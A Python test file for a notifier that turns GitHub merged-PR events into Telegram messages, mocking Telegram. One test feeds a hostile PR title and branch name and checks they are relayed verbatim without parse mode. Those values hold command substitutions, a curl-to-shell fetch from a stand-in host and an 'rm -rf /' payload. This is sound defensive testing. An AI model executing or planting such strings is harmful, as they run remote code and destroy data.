"""Phase 3: merged-PR notification, including untrusted-text handling (Telegram mocked)."""
import json

import notifier.github_events as gh


def run_event(path, *argv):
    return gh.main(["--event-file", str(path), *argv])


def test_merged_pr_sends_message(fixtures_dir, telegram_env, telegram_calls):
    assert run_event(fixtures_dir / "event_pr_merged.json") == 0
    assert len(telegram_calls) == 1
    text = telegram_calls[0][1]["text"]
    assert text.splitlines()[0] == "🔀 PR merged into main"
    assert "#42: Add Telegram summary for nightly regression suite" in text
    assert "Merged by: qa-lead" in text
    assert "Author: contributor-1" in text
    assert "Link: https://github.com/your-user/ai-news-telegram-bot/pull/42" in text


def test_closed_without_merge_sends_nothing(fixtures_dir, telegram_env, telegram_calls, caplog):
    caplog.set_level("INFO")
    assert run_event(fixtures_dir / "event_pr_closed.json") == 0
    assert telegram_calls == []
    assert "PR #43 was closed without merging" in caplog.text


def test_merge_into_non_default_branch_sends_nothing(fixtures_dir, telegram_env, telegram_calls):
    assert run_event(fixtures_dir / "event_pr_other_base.json") == 0
    assert telegram_calls == []


def test_non_closed_action_sends_nothing(fixtures_dir, tmp_path, telegram_env, telegram_calls):
    event = json.loads((fixtures_dir / "event_pr_merged.json").read_text())
    event["action"] = "opened"
    (tmp_path / "e.json").write_text(json.dumps(event))
    assert run_event(tmp_path / "e.json") == 0
    assert telegram_calls == []


def test_untrusted_title_and_branch_sent_verbatim(fixtures_dir, tmp_path, telegram_env, telegram_calls):
    hostile = 'Fix $(curl evil.sh | sh) `id` <b>bold</b> *md* "; rm -rf / #'
    event = json.loads((fixtures_dir / "event_pr_merged.json").read_text())
    event["pull_request"]["title"] = hostile
    event["pull_request"]["head"]["ref"] = "$(whoami)"
    (tmp_path / "e.json").write_text(json.dumps(event))
    assert run_event(tmp_path / "e.json") == 0
    _, payload = telegram_calls[0]
    assert f"#42: {hostile}" in payload["text"]
    assert "Branch: $(whoami) → main" in payload["text"]
    assert "parse_mode" not in payload


def test_preview_needs_no_credentials(fixtures_dir, capsys, telegram_calls):
    assert run_event(fixtures_dir / "event_pr_merged.json", "--preview") == 0
    assert "Merged by: qa-lead" in capsys.readouterr().out
    assert telegram_calls == []


def test_missing_event_file_is_config_error(tmp_path):
    assert run_event(tmp_path / "absent.json") == 3
